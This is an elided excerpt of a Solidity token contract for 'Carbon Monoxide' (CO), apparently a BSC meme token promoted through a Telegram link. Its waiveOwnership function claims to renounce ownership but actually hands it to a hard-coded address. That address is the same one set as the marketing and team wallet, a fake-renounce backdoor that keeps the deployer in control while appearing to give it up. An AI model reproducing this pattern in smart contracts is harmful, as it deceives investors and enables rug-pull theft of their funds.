...
/**
Telegram : https://t.me/CarbonMonoxideBSC
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x537ed754d0EeaEBd93797fa4c3b571ACD919894d);
    }
...
contract CarbonMonoxide is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Carbon Monoxide";
    string private _symbol = "CO";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x537ed754d0EeaEBd93797fa4c3b571ACD919894d);
    address payable private teamWalletAddress = payable(0x537ed754d0EeaEBd93797fa4c3b571ACD919894d);
